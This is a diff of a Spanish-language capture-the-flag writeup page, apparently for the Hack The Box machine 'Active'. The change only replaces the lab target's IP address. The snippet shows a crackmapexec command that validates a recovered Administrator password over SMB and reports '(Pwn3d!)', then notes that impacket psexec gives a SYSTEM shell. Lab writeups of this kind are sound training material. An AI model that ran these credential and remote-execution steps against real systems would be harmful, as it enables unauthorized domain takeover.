@@ -331,9 +331,9 @@ Session completed</span>
 
 <p class="plain-text">Podemos comprobarlos con crackmapexec, y nos devuelve que son válidas y como es el usuario Administrator también devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> tenemos privilegios máximos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.129.243.166 -u Administrator -p Ticketmaster1968
-</span><span class="az">SMB         </span><span class="p">10.129.243.166  445    DC               </span><span class="az">[*] </span><span class="p">Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">10.129.243.166  445    DC               </span><span class="ve">[+] </span><span class="p">active.htb\Administrator:Ticketmaster1968 </span><span class="am">(Pwn3d!)</span>
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.100 -u Administrator -p Ticketmaster1968
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="az">[*] </span><span class="p">Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="ve">[+] </span><span class="p">active.htb\Administrator:Ticketmaster1968 </span><span class="am">(Pwn3d!)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">psexec</code> de impacket y como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> obtenemos una cmd ahora tenemos privilegios para poder leer la flag de root</p>
